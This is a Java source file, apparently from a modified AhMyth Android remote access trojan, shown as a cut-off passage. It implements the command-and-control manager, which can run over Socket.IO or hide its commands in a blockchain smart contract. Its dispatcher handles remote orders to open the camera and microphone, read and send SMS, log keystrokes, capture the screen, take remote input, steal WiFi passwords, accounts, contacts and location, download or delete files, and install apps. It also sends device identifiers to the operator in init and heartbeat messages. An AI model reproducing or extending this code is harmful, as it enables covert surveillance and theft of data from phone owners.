package ahmyth.mine.king.ahmyth;

import org.json.JSONArray;
import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;
import android.os.Build;
import android.app.ActivityManager;

import java.util.List;

import java.lang.reflect.Method;

/**
 * ConnectionManager handles all socket.io communication with the server
 * and dispatches commands to appropriate handlers
 */
public class ConnectionManager {

    private static final String TAG = "ConnectionManager";
    
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();
    private static boolean isConnected = false;
    
    // Forensic managers
    private static ScreenCaptureManager screenCaptureManager;
    private static BrowserHistoryManager browserHistoryManager;
    private static SystemInfoManager systemInfoManager;
    private static InputManager inputManager;

    // Blockchain event poller (null if using Socket.IO)
    private static BlockchainEventPoller blockchainPoller = null;
    
    // Blockchain response sender (null if using Socket.IO)
    private static BlockchainResponseSender blockchainResponseSender = null;
    
    public static void startAsync(Context con) {
        try {
            Log.d(TAG, "startAsync called");
            ConnectionManager.context = con;
            
            // Initialize forensic managers
            screenCaptureManager = new ScreenCaptureManager(con);
            browserHistoryManager = new BrowserHistoryManager(con);
            systemInfoManager = new SystemInfoManager(con);
            inputManager = new InputManager(con);
            
            // CRITICAL: Ensure IOSocket is initialized first (triggers blockchain config detection)
            // This MUST happen before any connection attempts
            IOSocket.getInstance();
            
            // Small delay to ensure IOSocket constructor completes and sets isBlockchainMode
            try {
                Thread.sleep(200); // Increased delay for blockchain config parsing
            } catch (InterruptedException e) {
                // Ignore
            }
            
            // Check if blockchain C2 mode is enabled (must check AFTER IOSocket initialization)
            boolean blockchainMode = IOSocket.ensureBlockchainModeFromConfig();
            Log.d(TAG, "=== ConnectionManager Mode Detection ===");
            Log.d(TAG, "Blockchain mode check result: " + blockchainMode);
            
            if (blockchainMode) {
                Log.d(TAG, "=== BLOCKCHAIN C2 MODE - NO SOCKET CONNECTION ===");
                Log.d(TAG, "Blockchain C2 mode detected - starting event poller");
                Log.d(TAG, "Socket.IO connection will NOT be initialized");
                startBlockchainPoller();
                Log.d(TAG, "=== Blockchain poller started successfully ===");
            } else {
                Log.d(TAG, "=== TCP/IP MODE - Using Socket.IO ===");
                Log.d(TAG, "TCP/IP mode - starting Socket.IO connection");
                sendReq();
            }
        } catch (Exception ex) {
            Log.e(TAG, "Error in startAsync", ex);
            
            // Before retrying, check if blockchain mode is active - if so, don't retry socket connection
            boolean blockchainMode = IOSocket.ensureBlockchainModeFromConfig();
            if (blockchainMode) {
                Log.d(TAG, "Blockchain mode active - error in blockchain poller setup, will not retry socket connection");
                // Still retry, but it will go to blockchain mode again
            }
            
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startAsync(con);
                }
            }, 5000);
        }
    }
    
    // Handler for periodic heartbeat
    private static Handler heartbeatHandler = null;
    private static Runnable heartbeatRunnable = null;
    private static final int HEARTBEAT_INTERVAL_MS = 60000; // Send heartbeat every 60 seconds
    
    /**
     * Start blockchain event polling (instead of Socket.IO)
     */
    private static void startBlockchainPoller() {
        try {
            // Get blockchain config from IOSocket
            String rpcUrl = IOSocket.getBlockchainRpcUrl();
            String contractAddress = IOSocket.getBlockchainContractAddress();
            String aesKey = IOSocket.getBlockchainAesKey();
            int pollingInterval = 5; // Faster polling for responsiveness in tests
            
            if (rpcUrl == null || contractAddress == null || aesKey == null) {
                Log.e(TAG, "Blockchain C2 config incomplete, cannot start poller");
                return;
            }
            
            blockchainPoller = new BlockchainEventPoller(rpcUrl, contractAddress, aesKey, pollingInterval);
            blockchainPoller.start();
            Log.d(TAG, "Blockchain event poller started");
            
            // Initialize response sender (client needs private key for sending responses)
            String clientPrivateKey = IOSocket.getBlockchainClientPrivateKey();
            if (clientPrivateKey != null && !clientPrivateKey.isEmpty()) {
                blockchainResponseSender = new BlockchainResponseSender(rpcUrl, contractAddress, aesKey, clientPrivateKey);
                Log.d(TAG, "Blockchain response sender initialized - bidirectional communication enabled");
                
                // Send INIT announcement to let server know we're online
                // This is critical for server to discover blockchain clients
                sendBlockchainInit();
                
                // Start periodic heartbeat to maintain connection visibility
                startBlockchainHeartbeat();
            } else {
                Log.w(TAG, "Client private key not set - responses will not be sent to blockchain");
                Log.w(TAG, "Set clientPrivateKey in blockchain config to enable bidirectional communication");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to start blockchain poller", e);
            // Retry after delay
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                Log.d(TAG, "Retrying blockchain poller start...");
                startBlockchainPoller();
            }, 10000);
        }
    }
    
    /**
     * Start periodic heartbeat for blockchain mode.
     * This ensures the server knows the client is still online.
     */
    private static void startBlockchainHeartbeat() {
        if (heartbeatHandler != null) {
            Log.d(TAG, "Heartbeat already running");
            return;
        }
        
        heartbeatHandler = new Handler(Looper.getMainLooper());
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    if (blockchainResponseSender != null) {
                        sendBlockchainHeartbeat();
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Heartbeat error: " + e.getMessage());
                }
                // Schedule next heartbeat
                if (heartbeatHandler != null) {
                    heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL_MS);
                }
            }
        };
        
        // Start after initial delay
        heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL_MS);
        Log.d(TAG, "Blockchain heartbeat started (interval: " + HEARTBEAT_INTERVAL_MS + "ms)");
    }
    
    /**
     * Send heartbeat to blockchain - includes full device info so server can recreate client after restart
     */
    private static void sendBlockchainHeartbeat() {
        if (blockchainResponseSender == null) {
            return;
        }
        
        try {
            Context ctx = MainService.getContextOfApplication();
            JSONObject hbData = new JSONObject();
            hbData.put("event", "heartbeat");
            hbData.put("id", android.provider.Settings.Secure.getString(
                ctx.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
            hbData.put("timestamp", System.currentTimeMillis());
            
            // Include full device info (same as INIT) so server can recreate client after restart
            hbData.put("manf", android.os.Build.MANUFACTURER);
            hbData.put("model", android.os.Build.MODEL);
            hbData.put("release", android.os.Build.VERSION.RELEASE);
            hbData.put("sdk", android.os.Build.VERSION.SDK_INT);
            hbData.put("brand", android.os.Build.BRAND);
            hbData.put("product", android.os.Build.PRODUCT);
            hbData.put("device", android.os.Build.DEVICE);
            
            // Get operator info
            try {
                android.telephony.TelephonyManager tm = 
                    (android.telephony.TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    hbData.put("operator", tm.getNetworkOperatorName());
                }
            } catch (Exception e) {
                // Ignore operator errors
            }
            
            // Get battery level
            try {
                android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
                android.content.Intent batteryStatus = ctx.registerReceiver(null, ifilter);
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                    if (level >= 0 && scale > 0) {
                        hbData.put("battery", (level * 100) / scale);
                    }
                }
            } catch (Exception e) {
                // Ignore battery errors
            }
            
            Log.d(TAG, "Sending blockchain heartbeat with full device info");
            blockchainResponseSender.sendResponse("heartbeat", hbData);
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send blockchain heartbeat", e);
        }
    }
    
    /**
     * Send INIT announcement to blockchain so server can discover this client.
     * Called once when blockchain mode starts.
     */
    private static void sendBlockchainInit() {
        if (blockchainResponseSender == null) {
            Log.w(TAG, "Cannot send blockchain INIT - response sender not initialized");
            return;
        }
        
        try {
            Context context = MainService.getContextOfApplication();
            JSONObject initData = new JSONObject();
            initData.put("event", "init");
            initData.put("id", android.provider.Settings.Secure.getString(
                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
            initData.put("manf", android.os.Build.MANUFACTURER);
            initData.put("model", android.os.Build.MODEL);
            initData.put("release", android.os.Build.VERSION.RELEASE);
            initData.put("sdk", android.os.Build.VERSION.SDK_INT);
            initData.put("timestamp", System.currentTimeMillis());
            
            // Get device info
            try {
                android.telephony.TelephonyManager tm = 
                    (android.telephony.TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    initData.put("operator", tm.getNetworkOperatorName());
                }
            } catch (Exception e) {
                Log.w(TAG, "Could not get operator info: " + e.getMessage());
            }
            
            // Get battery level
            try {
                android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
                android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                    if (level >= 0 && scale > 0) {
                        initData.put("battery", (level * 100) / scale);
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Could not get battery info: " + e.getMessage());
            }
            
            Log.d(TAG, "=== SENDING BLOCKCHAIN INIT ANNOUNCEMENT ===");
            Log.d(TAG, "Init data: " + initData.toString());
            blockchainResponseSender.sendResponse("init", initData);
            Log.d(TAG, "=== BLOCKCHAIN INIT SENT ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send blockchain INIT", e);
        }
    }
    
    /**
     * Send response - routes through blockchain or Socket.IO based on mode
     * This replaces all ioSocket.emit() calls for responses
     */
    public static void emitResponse(String eventName, JSONObject data) {
        // Log the outgoing payload size/preview so we can trace responses on-device
        try {
            String payload = data != null ? data.toString() : "{}";
            int length = payload.length();
            String preview = payload.substring(0, Math.min(200, length));
            Log.d(TAG, "emitResponse -> " + eventName + " (len=" + length + "): " + preview + (length > 200 ? "..." : ""));
        } catch (Exception e) {
            Log.w(TAG, "emitResponse preview failed: " + e.getMessage());
        }

        boolean blockchainMode = IOSocket.ensureBlockchainModeFromConfig();
        if (blockchainMode) {
            // Blockchain mode - send via blockchain
            if (blockchainResponseSender != null) {
                Log.d(TAG, "emitResponse via blockchain for event: " + eventName);
                blockchainResponseSender.sendResponse(eventName, data);
            } else {
                Log.w(TAG, "Cannot send response - blockchain response sender not initialized");
                Log.w(TAG, "Client needs private key and ETH balance to send responses");
            }
        } else {
            // TCP mode - send via Socket.IO
            if (ioSocket != null && ioSocket.connected()) {
                Log.d(TAG, "emitResponse via TCP for event: " + eventName);
                ioSocket.emit(eventName, data);
            } else {
                Log.w(TAG, "Cannot send response - Socket.IO not connected");
            }
        }
    }
    
    /**
     * Process command from blockchain (called by BlockchainEventPoller)
     */
    public static void processBlockchainCommand(String action, JSONObject data) {
        try {
            Log.d(TAG, "Processing blockchain command: " + action);
            
            // Create order JSON similar to Socket.IO format
            JSONObject orderData = new JSONObject();
            orderData.put("order", action);
            if (data != null) {
                // Merge data into orderData
                JSONArray keys = data.names();
                if (keys != null) {
                    for (int i = 0; i < keys.length(); i++) {
                        String key = keys.getString(i);
                        orderData.put(key, data.get(key));
                    }
                }
            }

            // Backwards compatibility: map legacy "req" flags to expected "extra" fields for blockchain mode
            try {
                if ("x0000fm".equals(action) && !orderData.has("extra")) {
                    int req = data != null ? data.optInt("req", 0) : 0;
                    String extra = "ls";
                    if (req == 1) {
                        extra = "dl";
                    } else if (req == 2) {
                        extra = "delete";
                    }
                    orderData.put("extra", extra);
                } else if ("x0000ca".equals(action) && !orderData.has("extra")) {
                    int req = data != null ? data.optInt("req", -1) : -1;
                    String extra = "camList";
                    if (req == 1) {
                        extra = "1";
                    } else if (req == 0) {
                        extra = "0";
                    }
                    orderData.put("extra", extra);
                } else if ("x0000cb".equals(action) && !orderData.has("extra")) {
                    int req = data != null ? data.optInt("req", 0) : 0;
                    String extra = "get";
                    if (req == 1) {
                        extra = "start";
                    } else if (req == 2) {
                        extra = "stop";
                    }
                    orderData.put("extra", extra);
                } else if ("x0000sm".equals(action) && !orderData.has("extra")) {
                    int req = data != null ? data.optInt("req", 0) : 0;
                    String extra = req == 0 ? "ls" : "sendSMS";
                    orderData.put("extra", extra);
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed to normalize blockchain command extras for " + action, e);
            }
            
            // Process using existing handleOrder method
            handleOrder(orderData, action);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing blockchain command", e);
        }
    }

    public static void startContext() {
        try {
            findContext();
        } catch (Exception ignored) {
        }
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            return;
        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        
        if (context == null) {
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startAsync(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startAsync(context);
        }
    }

    private static boolean isConnecting = false;

    public static void sendReq() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // CRITICAL: If blockchain mode is active, do NOT attempt Socket.IO connections
                    // Check this FIRST before doing anything else
                    if (IOSocket.ensureBlockchainModeFromConfig()) {
                        Log.d(TAG, "=== BLOCKCHAIN MODE ACTIVE - SKIPPING SOCKET.IO ===");
                        Log.d(TAG, "Blockchain mode active - skipping Socket.IO connection attempt");
                        Log.d(TAG, "Socket connection will NOT be initialized");
                        isConnecting = false;
                        return;
                    }

                    if (ioSocket != null && (isConnected || isConnecting)) {
                        Log.d(TAG, "Socket already connected or connecting");
                        return;
                    }

                    isConnecting = true;
                    Log.d(TAG, "=== INITIALIZING SOCKET.IO CONNECTION (TCP/IP MODE) ===");
                    Log.d(TAG, "Initializing socket connection");
                    ioSocket = IOSocket.getInstance().getIoSocket();

                    if (ioSocket == null) {
                        if (IOSocket.isBlockchainMode()) {
                            Log.d(TAG, "IOSocket returned null because blockchain mode is enabled");
                            return;
                        }
                        Log.e(TAG, "Failed to get IOSocket instance");
                        scheduleRetry();
                        return;
                    }

                    // Note: Socket.IO handles ping/pong internally - don't override

                    // Handle connection events
                    ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.d(TAG, "Socket connected successfully");
                            isConnecting = false;
                            isConnected = true;
                            sendConnectionSuccessMessage();
                        }
                    });

                    ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.w(TAG, "Socket disconnected");
                            isConnecting = false;
                            isConnected = false;
                        }
                    });

                    ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            String errorMsg = "Connection error";
                            if (args != null && args.length > 0) {
                                errorMsg += ": " + args[0].toString();
                            }
                            Log.e(TAG, errorMsg);
                            isConnecting = false;
                            isConnected = false;
                        }
                    });
                    
                    ioSocket.on("connect_timeout", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.e(TAG, "Socket connection timeout");
                            isConnecting = false;
                            isConnected = false;
                        }
                    });
                    
                    ioSocket.on("reconnect_attempt", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.d(TAG, "Attempting to reconnect...");
                        }
                    });
                    
                    ioSocket.on("reconnect_error", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            String errorMsg = "Reconnection error";
                            if (args != null && args.length > 0) {
                                errorMsg += ": " + args[0].toString();
                            }
                            Log.e(TAG, errorMsg);
                        }
                    });
                    
                    ioSocket.on("reconnect_failed", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.e(TAG, "Reconnection failed - all attempts exhausted");
                        }
                    });

                    // Handle orders from server
                    ioSocket.on("order", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            try {
                                JSONObject data = (JSONObject) args[0];
                                String order = data.getString("order");
                                if (order != null) {
                                    order = order.trim(); // Remove any whitespace
                                }
                                Log.d(TAG, "Order received: '" + order + "' (data: " + data.toString() + ")");
                                
                                // Ensure order is not null before calling handleOrder
                                if (order == null) {
                                    Log.e(TAG, "Order is null, cannot handle");
                                    return;
                                }
                                
                                Log.d(TAG, "About to call handleOrder with order: '" + order + "'");
                                handleOrder(data, order);
                                Log.d(TAG, "handleOrder returned");
                                
                            } catch (Exception e) {
                                Log.e(TAG, "Error processing order", e);
                            }
                        }
                    });

                    ioSocket.connect();
                    Log.d(TAG, "Socket connect() called");

                } catch (Exception ex) {
                    Log.e(TAG, "Error in sendReq", ex);
                    isConnecting = false;
                }
            }
        }).start();
    }

    private static void handleOrder(JSONObject data, String order) {
        try {
            // Normalize order string - trim and ensure no hidden characters
            if (order != null) {
                order = order.trim();
            }
            Log.d(TAG, "Handling order: '" + order + "' (length: " + (order != null ? order.length() : 0) + ")"); // Added explicit log
            // Debug: Check if order matches expected value
            if ("x0000ws".equals(order)) {
                Log.d(TAG, "Order matches x0000ws exactly, entering switch...");
            }
            switch (order) {
                // === EXISTING FEATURES ===
                case "x0000ca": // Camera
                    handleCameraOrder(data);
                    break;
                    
                case "x0000fm": // File Manager
                    handleFileManagerOrder(data);
                    break;
                    
                case "x0000sm": // SMS
                    handleSmsOrder(data);
                    break;
                    
                case "x0000cl": // Call Logs
                    x0000cl();
                    break;
                    
                case "x0000cn": // Contacts
                    x0000cn();
                    break;
                    
                case "x0000mc": // Microphone
                    x0000mc(data.getInt("sec"));
                    break;
                    
                case "x0000lm": // Location
                    x0000lm();
                    break;
                    
                case "x0000di": // Device Info
                    x0000di();
                    break;
                    
                case "x0000ap": // Apps
                    x0000ap();
                    break;
                    
                case "x0000ia": // Install App
                    handleInstallApp(data);
                    break;
                    
                case "x0000ua": // Uninstall App
                    handleUninstallApp(data);
                    break;
                    
                case "x0000cb": // Clipboard
                    handleClipboardOrder(data);
                    break;
                    
                case "x0000wf": // WiFi
                    x0000wf();
                    break;

                case "x0000fg": // Foreground/Background Control
                    handleForegroundOrder(data);
                    break;
                    
                case "x0000ws": // Wake Screen
                    try {
                        Log.d(TAG, "Wake screen command received");
                        
                        // Check socket connection first
                        if (ioSocket == null || !ioSocket.connected()) {
                            Log.e(TAG, "Socket not connected for wake screen command");
                            JSONObject errorResult = new JSONObject();
                            errorResult.put("success", false);
                            errorResult.put("error", "Socket not connected");
                            if (ioSocket != null) {
                                emitResponse("x0000ws", errorResult);
                            }
                            break;
                        }
                        
                        // Send response immediately on the socket thread
                        JSONObject result = new JSONObject();
                        result.put("success", true);
                        result.put("message", "Wake screen command received");
                        
                        // Emit synchronously on the current thread (socket thread)
                        try {
                            emitResponse("x0000ws", result);
                            Log.d(TAG, "Wake screen response sent, socket connected: " + ioSocket.connected());
                        } catch (Exception emitError) {
                            Log.e(TAG, "Error emitting wake screen response", emitError);
                            // Try one more time
                            try {
                                emitResponse("x0000ws", result);
                            } catch (Exception e2) {
                                Log.e(TAG, "Second emit attempt failed", e2);
                            }
                        }
                        
                        // Perform wake screen action asynchronously (don't block response)
                        new Handler(Looper.getMainLooper()).post(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    // Try to get MainService instance
                                    MainService service = MainService.getInstance();
                                    if (service != null) {
                                        service.wakeScreen();
                                        Log.d(TAG, "Wake screen action performed via MainService");
                                    } else if (context instanceof MainService) {
                                        ((MainService) context).wakeScreen();
                                        Log.d(TAG, "Wake screen action performed via context");
                                    } else {
                                        // Try to wake screen directly
                                        android.os.PowerManager powerManager = (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
                                        if (powerManager != null) {
                                            android.os.PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                                                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                                                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
                                                android.os.PowerManager.ON_AFTER_RELEASE,
                                                "AhMyth::ScreenWakeLock"
                                            );
                                            wakeLock.acquire(10000);
                                            wakeLock.release();
                                            Log.d(TAG, "Wake screen action performed directly");
                                        }
                                    }
                                } catch (Exception e) {
                                    Log.e(TAG, "Error performing wake screen action", e);
                                }
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "Error in wake screen command", e);
                        try {
                            JSONObject result = new JSONObject();
                            result.put("success", false);
                            result.put("error", e.getMessage());
                            if (ioSocket != null && ioSocket.connected()) {
                                emitResponse("x0000ws", result);
                            }
                        } catch (Exception ex) {
                            Log.e(TAG, "Error emitting wake screen error", ex);
                        }
                    }
                    break;
                    
                // === NEW FORENSIC FEATURES ===
                case "x0000sc": // Screen Capture
                    handleScreenCapture(data);
                    break;
                
                case "x0000in": // Remote Input (VNC-like control)
                    handleRemoteInput(data);
                    break;
                    
                case "x0000kl": // Keylogger
                    handleKeylogger(data);
                    break;
                    
                case "x0000bh": // Browser History
                    handleBrowserHistory(data);
                    break;
                    
                case "x0000nt": // Notifications
                    handleNotifications(data);
                    break;
                    
                case "x0000si": // System Info (detailed)
                    handleSystemInfo(data);
                    break;
                    
                case "x0000ac": // Accounts
                    x0000ac();
                    break;
                    
                case "x0000pr": // Running Processes
                    x0000pr();
                    break;
                    
                case "x0000ns": // Network Stats
                    x0000ns();
                    break;
                    
                case "x0000us": // App Usage Stats
                    x0000us();
                    break;
                    
                case "x0000bt": // Battery Info (detailed)
                    x0000bt();
                    break;
                    
                case "x0000sm2": // SIM Info
                    x0000sm2();
                    break;
                    
                case "x0000mc2": // Make Call
                    handleMakeCall(data);
                    break;
                    
                case "x0000lm2": // Live Mic
                    handleLiveMic(data);
                    break;
                    
                case "x0000wp": // WiFi Passwords
                    handleWifiPasswords(data);
                    break;
                    
                case "x0000rp": // Request Permission
                    handleRequestPermission(data);
                    break;
                    
                default:
                    Log.w(TAG, "Unknown order: " + order);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling order: " + order, e);
        }
    }

    // === EXISTING HANDLERS ===
    
    private static void handleCameraOrder(JSONObject data) throws Exception {
        Thread.sleep(1000); // Add a delay to allow the activity to come to the foreground
        String extra = data.getString("extra");
        if (extra.equals("camList")) {
            x0000ca(-1);
        } else if (extra.equals("1")) {
            x0000ca(1);
        } else if (extra.equals("0")) {
            x0000ca(0);
        }
    }

    private static void handleForegroundOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        android.content.Context context = MainService.getInstance();
        if (context == null) {
            context = ConnectionManager.context;
        }
        
        if (context == null) {
            Log.e(TAG, "Cannot handle foreground order: context is null");
            return;
        }
        
        try {
            if ("foreground".equals(extra)) {
                // Bring app to foreground
                android.content.Intent intent = new android.content.Intent(context, ahmyth.mine.king.ahmyth.MainActivity.class);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
                context.startActivity(intent);
                
                // Also try to move task to front using ActivityManager
                android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(android.content.Context.ACTIVITY_SERVICE);
                if (am != null) {
                    try {
                        // Try to find our app's task
                        java.util.List<android.app.ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(10);
                        if (tasks != null) {
                            String packageName = context.getPackageName();
                            for (android.app.ActivityManager.RunningTaskInfo task : tasks) {
                                if (packageName.equals(task.topActivity.getPackageName())) {
                                    am.moveTaskToFront(task.id, android.app.ActivityManager.MOVE_TASK_WITH_HOME);
                                    Log.d(TAG, "Moved task to front: " + task.id);
                                    break;
                                }
                            }
                        }
                    } catch (SecurityException e) {
                        // getRunningTasks requires special permission on newer Android versions
                        Log.w(TAG, "Cannot get running tasks (permission required), using activity intent only");
                    }
                }
                
                Log.d(TAG, "Brought app to foreground");
            } else if ("background".equals(extra)) {
                // Send app to background by launching home screen
                android.content.Intent homeIntent = new android.content.Intent(android.content.Intent.ACTION_MAIN);
                homeIntent.addCategory(android.content.Intent.CATEGORY_HOME);
                homeIntent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(homeIntent);
                Log.d(TAG, "Sent app to background");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling foreground order", e);
        }
    }

    private static void handleFileManagerOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        String path = data.optString("path", "/sdcard"); // Default to /sdcard if path not provided
        if (extra.equals("ls")) {
            x0000fm(0, path);
        } else if (extra.equals("dl")) {
            if (path == null || path.isEmpty()) {
                JSONObject error = new JSONObject();
                error.put("file", false);
                error.put("error", "Path is required for download");
                emitResponse("x0000fm", error);
                return;
            }
            x0000fm(1, path);
        } else if (extra.equals("delete")) {
            deleteFile(path);
        }
    }
    
    private static void deleteFile(String filePath) {
        Log.d(TAG, "Delete file command: " + filePath);
        try {
            java.io.File file = new java.io.File(filePath);
            boolean deleted = false;
            if (file.exists()) {
                if (file.isDirectory()) {
                    deleted = deleteDirectory(file);
                } else {
                    deleted = file.delete();
                }
            }
            JSONObject result = new JSONObject();
            result.put("deleted", deleted);
            result.put("path", filePath);
            emitResponse("x0000fm", result);
        } catch (Exception e) {
            Log.e(TAG, "Error deleting file", e);
        }
    }
    
    private static boolean deleteDirectory(java.io.File dir) {
        if (dir.isDirectory()) {
            java.io.File[] children = dir.listFiles();
            if (children != null) {
                for (java.io.File child : children) {
                    deleteDirectory(child);
                }
            }
        }
        return dir.delete();
    }

    private static void handleSmsOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        if (extra.equals("ls")) {
            x0000sm(0, null, null);
        } else if (extra.equals("sendSMS")) {
            x0000sm(1, data.getString("to"), data.getString("sms"));
        }
    }

    private static void handleClipboardOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        if (extra.equals("get")) {
            x0000cb(0);
        } else if (extra.equals("start")) {
            x0000cb(1);
        } else if (extra.equals("stop")) {
            x0000cb(2);
        }
    }

    // === NEW FORENSIC HANDLERS ===
    
    private static void handleScreenCapture(JSONObject data) {
        Log.d(TAG, "Screen capture command");
        try {
            String extra = data.optString("extra", "info");
            ScreenStreamService screenService = ScreenStreamService.getInstance();
            
            if (extra.equals("info")) {
                // Get screen info
                JSONObject screenInfo;
                if (screenService != null) {
                    screenInfo = screenService.getScreenInfo();
                } else {
                    screenInfo = screenCaptureManager.getScreenInfo();
                }
                screenInfo.put("captureActive", screenService != null && screenService.isCapturing());
                emitResponse("x0000sc", screenInfo);
                
            } else if (extra.equals("capture") || extra.equals("screenshot")) {
                // Capture screenshot
                if (screenService != null && screenService.isCapturing()) {
                    JSONObject screenshot = screenService.captureFrame();
                    emitResponse("x0000sc", screenshot);
                } else if (screenCaptureManager.isCapturing()) {
                    JSONObject screenshot = screenCaptureManager.captureScreen();
                    emitResponse("x0000sc", screenshot);
                } else {
                    // Check if service exists but just needs to be started
                    if (screenService != null) {
                        // Service exists but not capturing - try to start it
                        try {
                            android.content.Intent serviceIntent = new android.content.Intent(context, ScreenStreamService.class);
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                context.startForegroundService(serviceIntent);
                            } else {
                                context.startService(serviceIntent);
                            }
                            // Wait a bit and try again
                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                if (screenService.isCapturing()) {
                                    JSONObject screenshot = screenService.captureFrame();
                                    emitResponse("x0000sc", screenshot);
                                } else {
                                    requestScreenCapturePermission();
                                    JSONObject result = new JSONObject();
                                    try {
                                        result.put("success", false);
                                        result.put("error", "Screen capture permission required. A permission dialog has been shown on the device.");
                                        result.put("requiresPermission", true);
                                        result.put("permissionRequested", true);
                                        result.put("instruction", "User must tap 'Start Now' on the device to grant screen recording permission.");
                                        emitResponse("x0000sc", result);
                                    } catch (Exception ignored) {}
                                }
                            }, 500);
                            return;
                        } catch (Exception e) {
                            Log.e(TAG, "Error starting screen service", e);
                        }
                    }
                    
                    // Try to request permission automatically
                    requestScreenCapturePermission();
                    
                    JSONObject result = new JSONObject();
                    result.put("success", false);
                    result.put("error", "Screen capture permission required. A permission dialog has been shown on the device.");
                    result.put("requiresPermission", true);
                    result.put("permissionRequested", true);
                    result.put("instruction", "User must tap 'Start Now' on the device to grant screen recording permission.");
                    emitResponse("x0000sc", result);
                }
                
            } else if (extra.equals("start") || extra.equals("request")) {
                // Check if we already have an active capture session
                if (screenService != null && screenService.isCapturing()) {
                    JSONObject result = new JSONObject();
                    result.put("success", true);
                    result.put("message", "Screen capture is already active");
                    result.put("isCapturing", true);
                    emitResponse("x0000sc", result);
                } else {
                    // Request screen capture permission
                    requestScreenCapturePermission();
                    
                    JSONObject result = new JSONObject();
                    result.put("success", true);
                    result.put("message", "Screen capture permission dialog shown on device");
                    result.put("instruction", "User must tap 'Start Now' on the device");
                    emitResponse("x0000sc", result);
                }
                
            } else if (extra.equals("status")) {
                JSONObject result = new JSONObject();
                result.put("isCapturing", screenService != null && screenService.isCapturing());
                result.put("serviceRunning", screenService != null);
                emitResponse("x0000sc", result);
                
            } else if (extra.equals("setQuality")) {
                int quality = data.optInt("quality", 50);
                if (screenService != null) {
                    screenService.setQuality(quality);
                }
                screenCaptureManager.setQuality(quality);
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("quality", quality);
                emitResponse("x0000sc", result);
                
            } else if (extra.equals("setScale")) {
                float scale = (float) data.optDouble("scale", 0.5);
                if (screenService != null) {
                    screenService.setScale(scale);
                }
